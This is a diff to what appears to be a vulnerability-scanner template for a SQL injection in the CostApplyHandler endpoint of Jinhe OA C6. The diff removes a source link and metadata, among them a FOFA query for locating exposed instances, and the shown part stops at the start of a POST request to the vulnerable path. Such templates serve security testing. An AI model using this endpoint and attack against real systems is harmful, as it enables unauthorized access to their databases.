@@ -3,12 +3,8 @@ info:
   name: 金和OAC6 CostApplyHandler存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/am61f8eoo0x3oohq'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: am61f8eoo0x3oohq
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'POST /c6/JHSoft.Web.CostControl/BudgetExecution/Handlers/CostApplyHandler.ashx HTTP/1.1
